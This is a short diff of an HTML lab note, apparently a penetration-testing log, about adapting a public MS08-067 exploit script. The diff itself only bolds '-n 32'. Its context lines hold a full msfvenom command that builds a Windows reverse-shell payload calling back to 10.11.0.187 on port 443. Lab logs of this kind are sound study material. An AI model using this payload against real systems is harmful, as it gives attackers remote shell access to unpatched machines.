@@ -9,7 +9,7 @@ tried for hours to modify exploit and finally got it<br/>
 https://github.com/ohnozzy/Exploit/blob/master/MS08_067.py<br/>
 Modified shellcode with:<br/>
 msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.187 LPORT=443 &nbsp;EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -n 32 -f python<br/>
-Had to use -n 32 to get it to match the size of the payload in the example<br/>
+Had to use <b>-n 32 </b>to get it to match the size of the payload in the example<br/>
 <br/>
 <img src="image.png" /><br/>
 <br/>
